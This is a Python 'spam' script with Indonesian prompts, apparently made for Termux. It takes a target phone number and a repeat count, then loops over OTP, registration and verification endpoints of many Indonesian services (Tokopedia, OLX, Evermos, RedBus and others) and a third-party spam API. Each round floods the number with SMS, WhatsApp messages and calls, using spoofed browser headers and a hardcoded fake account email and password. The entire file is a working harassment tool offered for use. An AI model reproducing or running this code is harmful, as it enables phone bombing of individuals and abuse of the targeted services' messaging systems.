import os,sys,time,requests,json,random
from colorama import Fore,Back,init

B = Fore.BLUE
W = Fore.WHITE
R = Fore.RED
G = Fore.GREEN
BL = Fore.BLACK
Y = Fore.YELLOW

#color
Hijau="\033[1;92m"
putih="\033[1;97m"
abu="\033[1;90m"
kuning="\033[1;93m"
ungu="\033[1;95m"
merah="\33[37;1m"
biru="\033[1;96m"

bg="\033[1;0m\033[1;41mText\033[1;0m"

try:
    import os,sys,time,requests,json,random
    from colorama import Fore,Back,init
except ModuleNotFoundError:
    print(f"{W}[{R}!{W}] Bahan Belum Terinstall{abu}...")
    time.sleep(5)
    print(f"{W}[{R}!{W}] Type{R}:{Y}pip{W} install colorama requests")

def mengetik(z):
    for e in z + "\n":
      sys.stdout.write(e)
      sys.stdout.flush()
      time.sleep(0.01)

def mr_wibu():
    mr_tytyd = input(f"{B}Kirim spam lagi!!! {putih}({G}y{W}/{Y}n{putih}){R}:{W} ")
    if mr_tytyd=="y" or mr_tytyd=="Y":
        time.sleep(5)
        put()
    if mr_tytyd=="n" or mr_tytyd=="N":
        sys.exit(f"{W}[{R}!{W}] Keluar dari script{biru}....{W}")
        time.sleep(5)

def logo_taekyung():
    try:
        os.system("xdg-open https://youtube.com/@TutorialTermux")
        time.sleep(3)
        os.system("clear")
        print(f"""

\033[1;92m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢄⡀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢻⣦⡀⠀⠀⠀⠀⠀⠀⠙⢦⠀⣴⠀⠀⠀⡀⣴⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠻⣿⣷⣤⡀⠠⠀⠀⠀⠀⠀⢹⠀⠀⠀⣴⣏⠁⢀⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠠⢆⠀⠀⠰⡂⠠⠀⠀⠈⠙⠻⠿⠁⠀⠀⠀⠀⠈⣼⠀⣠⣾⣿⢸⣴⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠐⢤⡄⢸⣆⠀⠀⠁⠀⠀⠀⠀⡦⡀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣷⣿⣿⡿⠀⠀⣀⣠⡤⠀⣀⠤⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠁⠈⣿⣿⡻⠷⢦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣧⣴⣿⣟⣵⣴⡾⠃⠂⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠘⡌⡇⠀⠸⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡐⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢁⠂⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠹⡇⠀⠀⠙⣿⣿⣿⣦⣀⠀⠀⡇⡀⠀⠀⠀⠀⠊⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣶⣤⣶⣶⣶⣶⠾⠃
⠀⠀⠀⠀⠀⠀⠀⡗⠀⠀⠀⡽⣿⣿⣿⣿⣷⣄⣿⡥⠀⠀⠄⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⡁⠀⠀
⠀⠀⠀⠠⢆⣒⡀⠣⢄⠀⠀⠘⣾⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⡉⠀⠐⠀⠀⠀
⠀⠀⠀⠀⠀⢉⣿⣷⣄⡀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⡀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢣⠀⠁⢀⡄⠑⢄⡘⠿⠟⠛⠛⠉⠍⠉⠀⠒⠒⠂⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀
⠀⠀⠀⠀⠀⠀⠀⣅⣴⣯⠴⠂⣁⡀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠒⠒⠒⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠿⢿⣄
⠀⠀⠀⠀⠀⠀⠈⠉⣿⠁⠀⣀⠀⠀⠀⠐⢒⠒⢲⡖⠒⠒⠒⠒⠒⠒⢺⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠈
⠀⠀⠀⠀⠀⠀⠀⠀⣻⡀⠀⠤⢤⣤⣤⡄⠈⠀⠸⡇⠀⠀⠀⠀⠀⡠⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣴⣿⣷⡀⠀⠀⠈⠉⠃⠂⠀⠀⠀⠀⠀⠀⢠⠋⡔⣿⣿⣿⣿⣿⣿⠿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀
⠀⠀⠀⠀⠀⢠⣾⣏⢀⠙⣷⡀⠐⠤⣄⡠⢀⡀⠠⠀⠀⠀⢀⠚⡄⠣⣿⣿⣿⣛⢛⠿⣦⡂⠀⡀⠈⠙⢿⡝⢿⣿⣿⣿⡄⠀
⠀⠀⢰⡀⢰⣿⣿⣿⡈⠑⣔⡵⠢⣄⣈⠙⠂⠀⠀⢀⡀⠀⠉⠉⠉⠁⣿⢻⢸⣿⠀⠀⠊⠙⢧⠨⢆⠀⠈⢻⡌⢻⣿⣿⠳⠀
⠀⠀⣼⣷⣿⣿⣿⣿⣇⠰⡁⣷⠰⡿⣿⡿⠿⡿⢿⣭⣭⠏⢁⠀⠀⡈⣿⡎⠘⣿⠀⡀⡔⢬⠕⢷⢒⡳⡄⠀⠁⠀⢻⣿⡄⠁
⠀⣰⣿⣿⣿⣿⣿⣿⣿⣦⠈⠻⡇⠇⢻⣷⡀⠀⠽⠫⠛⢷⣦⣁⡠⠀⣿⡏⠄⢻⣇⠪⠪⠁⠬⢊⠜⠁⢸⣄⠀⠀⠀⣿⣇⠀
⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠘⠀⠀⠉⠛⠒⠒⠒⣒⠾⠛⠻⣉⠁⣿⢠⠀⢂⢇⠁⠉⠀⠉⠀⣰⠇⠸⢈⠆⢂⠀⢸⣿⠀
⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⣠⣤⣤⣶⡶⠀⠀⠀⠀⠀⠀⠀⣿⢈⠀⠀⠺⠀⠀⠀⠀⢀⠏⢠⣶⣿⡘⡈⡆⠰⣿⡇
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣏⠉⢀⣀⣤⡄⠀⠀⠀⠀⠀⠀⣿⠸⠀⠀⠀⠁⠀⠀⠀⠊⠀⣾⡟⡟⠀⠡⣿⡀⢿⠃
⠈⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⠛⠉⢀⣠⠀⠀⠀⠀⡀⠀⢸⢀⠄⠀⠀⠀⠀⠀⠀⢀⣼⢿⡇⢡⠀⠀⢿⣇⠸⡀
⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡷⣶⠛⠁⠀⠀⠀⠀⠀⠐⣾⠀⠀⠀⠀⠀⠀⠀⢀⣾⡏⠀⠙⠢⡀⠀⢈⢯⡄⠁
⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡙⢦⡀⠀⠀⠀⠒⠂⠀⢿⠲⠖⠀⠀⠀⢀⣴⠟⢸⠀⣀⣤⡾⢷⠀⡘⣼⣷⠀
⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⠿⠿⠿⣿⣿⣿⣷⡈⣿⠲⢄⠀⠐⠂⠉⣹⠒⠀⠀⢀⢔⣿⣃⣠⣴⠾⣛⣵⡞⢹⣿⣱⠟⠻⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠛⢿⠁⠀⠀⠀⠀⣿⣿⣿⣿⣿⣑⣆⠑⣤⣀⣀⣿⣀⡤⠊⠠⠾⠛⠉⠓⠂⣸⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢂⠀⠀⠀⢀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣷⣄⣀⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⠒⠂⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[1;91m\033[1;41m\033[1;97m Author : Demias Syihab Aldino\033[;0m\033[1;91m\033[1;92m
\033[1;91m\033[1;41m\033[1;97m Whatsapp : +62895320372281\033[;0m\033[1;91m\033[1;92m
\033[1;91m\033[1;41m\033[1;97m Github : https://github.com/maskprivate1457\033[;0m\033[1;91m\033[1;92m
""")
    except requests.exceptions.ConnectionError:
        sys.exit(f"{W}[{R}!{W}] Eror Cek Jaringan{abu}....{abu}")
    except KeyboardInterrupt:
        sys.exit(f"{W}[{R}!{W}] Kluar{abu}...{W}")
        

def put():
    logo_taekyung()
    try:
        mr_ua=random.choice(["Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v7108827108815046027 t6205049005192687891","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1692361810532096513 t9071033982482470646","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4466439914708508420 t8068951106021062059","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v8880767681151577953 t8052286838287810618","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v6215776200348075665 t6662866128547677118","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1588190262877692089 t2919217341348717815","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5330150654511677032 t9071033982482470646","Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36"])
        mengetik("\033[1;30m<════════════[\033[1;33;41m • \033[1;37m Masukkan Nomor \033[1;33m• \033[0m\033[1;30m]══════════════>")
        mengetik("\033[37m[\033[31m•\033[37m]\033[32m Contoh nomor\033[37m : \033[37m\033[33m8*****\033[33m")
        mr_am=input(f"\n\033[37m[\033[31m•\033[37m]\033[32m Nomor Target\033[32m \033[37m:\033[37m\033[33m ")
        mengetik("\033[1;30m<════════════[\033[1;33;41m • \033[1;37m BEBAS JUMLAH UNLIMITED \033[1;33m• \033[0m\033[1;30m]═════════════>")
        power_python=int(input(f"\033[37m[\033[31m•\033[37m]\033[32m Jumlah Spam\033[37m :\033[37m\033[33m "))
        print ("")
        for i in range(int(power_python)):
            time.sleep(1)
            jag2={"Host":"id.jagreward.com","Connection":"keep-alive","Accept":"*/*","User-Agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty","Referer":"https://id.jagreward.com/member/register/","Accept-Encoding":"gzip, deflate, br","Accept-Language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
            jag=requests.get("https://id.jagreward.com/member/verify-mobile/"+mr_am+"/",headers=jag2).text
            if "call" in jag:
                mengetik(f"{W}[{G}✓{W}] Mengirim Spam Call Ke No {Y}{mr_am}")
            else:
                mengetik(f"{W}[{R}×{W}] Gagal Mengirim Spam Call Ke No {Y}{mr_am}")
            time.sleep(1)
            url = "https://aink-sanz.herokuapp.com/api/free-tutorial-spam-wa"
            AM = {
            "nomor": mr_am
            }
            sms = requests.get(url, params=AM)
            gas = sms.text
            if "Berhasil Ngab" in gas:
                mengetik(f"{W}[{R}×{W}] Gagal Mengirim Spam WA Ke No {Y}{mr_am}")
            else:
                mengetik(f"{W}[{G}✓{W}] Mengirim Spam WA Ke No {Y}{mr_am}")
            time.sleep(1)
            dekor2=requests.post("https://auth.dekoruma.com/api/v1/register/request-otp-phone-number/?format=json",headers={"Host":"auth.dekoruma.com","save-data":"on","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json","accept":"*/*","origin":"https://m.dekoruma.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.dekoruma.com/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phoneNumber":"+62"+mr_am,"platform":"sms"})).text
            if "ok" in dekor2:
                mengetik(f"{W}[{G}✓{W}] Mengirim Spam Sms Ke No {Y}{mr_am}")
            else:
                mengetik(f"{W}[{R}×{W}] Gagal Mengirim Spam Sms Ke No {Y}{mr_am}")
            time.sleep(1)
            buka=requests.post("https://api.bukuwarung.com/api/v1/auth/otp/send",headers={"Accept":"application/json","X-APP-VERSION-NAME":"3.4.0","X-APP-VERSION-CODE":"3399","Content-Type":"application/json; charset=UTF-8","Host":"api.bukuwarung.com","Connection":"Keep-Alive","Accept-Encoding":"gzip","User-Agent":"Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36"},json={"action":"LOGIN_OTP","countryCode":"62","deviceId":"00000177-142d-f1a2-bac4-57a9039fdc4d","method":"WA","phone":"0"+mr_am}).text
            if "neng" in buka:
                mengetik(f"{W}[{R}×{W}] Gagal Mengirim Spam WA Ke No {Y}{mr_am}")
            else:
                mengetik(f"{W}[{G}✓{W}] Mengirim Spam WAKe No {Y}{mr_am}")
            time.sleep(1)
            lummo={"Host":"api.tokko.io","accept-language":"id","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json","accept":"*/*","origin":"https://web.lummoshop.com","sec-fetch-site":"cross-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://web.lummoshop.com/","accept-encoding":"gzip, deflate, br"}
            gas=json.dumps({"operationName":"generateOTP","variables":{"generateOtpInput":{"phoneNumber":"+62"+mr_am,"hashCode":"","channel":"SMS","userType":"MERCHANT"}},"query":"mutation generateOTP($generateOtpInput: GenerateOtpInput!) {\n  generateOtp(generateOtpInput: $generateOtpInput) {\n    phoneNumber\n  }\n}\n"})
            gaskeun=requests.post("https://api.tokko.io/graphql",headers=lummo,data=gas).text
            if "erors" in gaskeun:
                mengetik(f"{W}[{R}×{W}] Gagal Mengirim Spam SmsKe No {Y}{mr_am}")
            else:
                mengetik(f"{W}[{G}✓{W}] Mengirim Spam Sms Ke No {Y}{mr_am}")
            time.sleep(1)
            AmmarGamteng=requests.post("https://www.olx.co.id/api/auth/authenticate",data=json.dumps({"grantType": "retry","method": "sms","phone":"62"+mr_am,"language": "id"}), headers={"accept": "*/*","x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=","x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063","user-agent": mr_ua,"content-type": "application/json"}).text
            if "PENDING" in AmmarGamteng:
                mengetik(f"{W}[{G}✓{W}] Mengirim Spam Sms Ke No {Y}{mr_am}")
            else:
                mengetik(f"{W}[{R}×{W}] Gagal Mengirim Spam Sms Ke No {Y}{mr_am}{W}")
            time.sleep(1)
            AmmarBN={"Host":"beryllium.mapclub.com","content-type":"application/json","accept-language":"en-US","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","origin":"https://www.mapclub.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.mapclub.com/","accept-encoding":"gzip, deflate, br"}
            wkwk=json.dumps({"account":mr_am})
            req = requests.post("https://beryllium.mapclub.com/api/member/registration/sms/otp",headers=AmmarBN,data=wkwk).text
            if "salto" in req:
                mengetik(f"{W}[{R}×{W}] Gagal Mengirim Spam Sms Ke No {Y}{mr_am}")
            else:
                mengetik(f"{W}[{G}✓{W}] Mengirim Spam Sms Ke No {Y}{mr_am}")
            time.sleep(2)
            ol={"Host":"api-dash.olsera.co.id","content-length":"337","accept":"application/json, text/plain, */*","content-type":"application/json;charset=UTF-8","sec-ch-ua-mobile":"?0","user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Safari/537.36","sec-ch-ua-platform":"Linux","origin":"https://dashboard.olsera.co.id","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://dashboard.olsera.co.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
            ol2=json.dumps({"name":"AmmarExecuted","email":"margeng84@gmail.com","password":"@mm4rgans","phone":"+62"+mr_am,"phone_format":mr_am,"name_toko":"","url_id":"","business_type_id":"","service_type_id":3,"country_id":"ID","city_id":"","state_id":"","pos_resto_mode":0,"i_agree":"true","address":"","id":"null","tokenMiscall":"","use_otp_type":3})
            o13=requests.post("https://api-dash.olsera.co.id/api/admin/v1/en/register",headers=ol,data=ol2).text
            if "gas" in o13:
                mengetik(f"{W}[{R}×{W}] Gagal Mengirim Spam Sms Ke No {Y}{mr_am}")
            else:
                mengetik(f"{W}[{G}✓{W}] Mengirim Spam Sms Ke No {Y}{mr_am}")
            time.sleep(1)
            ua={"Host":"auth.sampingan.co","domain-name":"auth-svc","app-auth":"Skip","content-type":"application/json; charset=UTF-8","user-agent":"okhttp/4.9.1","accept":"application/vnd.full+json","accept":"application/json","content-type":"application/vnd.full+json","content-type":"application/json","app-version":"2.1.2","app-platform":"Android"}
            data=json.dumps({"channel":"WA","country_code":"+62","phone_number":mr_am})
            coi=requests.post("https://auth.sampingan.co/v1/otp",data=data,headers=ua).text
            if "coi" in coi:
                mengetik(f"{W}[{R}×{W}] Gagal Mengirim Spam WA Ke No {Y}{mr_am}")
            else:
                mengetik(f"{W}[{G}✓{W}] Mengirim Spam WA Ke No {Y}{mr_am}")
            time.sleep(1)
            Ammar={"Host":"www.autofun.co.id","content-length":"84","accept":"*/*","save-data":"on","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json;charset=UTF-8","origin":"https://www.autofun.co.id","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.autofun.co.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
            Ganz=json.dumps({"phoneNum":"620"+mr_am,"languageCode":"id-id","countryCode":"id","platform":2})
            Gwganz=requests.post("https://www.autofun.co.id/v2/captcha/sms",headers=Ammar,data=Ganz).text
            if "cus" in Gwganz:
                mengetik(f"{W}[{R}×{W}] Gagal Mengirim Spam SnsKe No {Y}{mr_am}")
            else:
                mengetik(f"{W}[{G}✓{W}] Mengirim Spam Sms Ke No {Y}{mr_am}")
            time.sleep(2)
            heading = {"Host":"evermos.com","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json;charset=UTF-8","origin":"https://evermos.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://evermos.com/registration/otp","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
            ammarganz=json.dumps({"phone":"62"+mr_am})
            req=requests.post("https://evermos.com/api/register/phone-registration",headers=heading,data=ammarganz).text
            if "woi" in req:
                mengetik(f"{W}[{R}×{W}] Gagal Mengirim Spam Sms Ke No {Y}{mr_am}")
            else:
                mengetik(f"{W}[{G}✓{W}] Mengirim Spam Sms Ke No {Y}{mr_am}")
            time.sleep(1)
            kepala={"Host":"m.redbus.id","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","accept":"*/*","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.redbus.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",}
            gw=requests.get("https://m.redbus.id/api/getOtp?number="+mr_am+"&cc=62&whatsAppOpted=true&disableOtpFlow=undefined",headers=kepala).text
            if "send" in gw:
                mengetik(f"{W}[{R}×{W}] Gagal Mengirim Spam WA Ke No {Y}{mr_am}")
            else:
                mengetik(f"{W}[{G}✓{W}] Mengirim Spam WA Ke No {Y}{mr_am}")
            time.sleep(1)
            headers = {'Connection' : 'keep-alive','Accept' : 'application/json, text/javascript, */*; q=0.01','Origin' : 'https://accounts.tokopedia.com','X-Requested-With' : 'XMLHttpRequest','User-Agent' : '{acak}','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8','Accept-Encoding' : 'gzip, deflate',}
            site = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn=0'+mr_am+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = headers).text
            if "sms" in site:
                mengetik(f"{W}[{R}×{W}] Gagal Mengirim Spam Sms Ke No {Y}{mr_am}")
            else:
                mengetik(f"{W}[{G}✓{W}] Mengirim Spam Sms Ke No {Y}{mr_am}")
        mr_wibu()
    except requests.exceptions.ConnectionError:
        sys.exit(f"{W}[{R}!{W}] Eror Cek Jaringan lu Ngab{abu}....{abu}")
    except KeyboardInterrupt:
        sys.exit(f"{W}[{R}!{W}] Keluar!!{abu}...{W}")
    except ValueError:
        sys.exit(f"{W}[{Y}!{W}] Lu jangan asal masukin{abu}.....")
        

if __name__=='__main__':
    put()

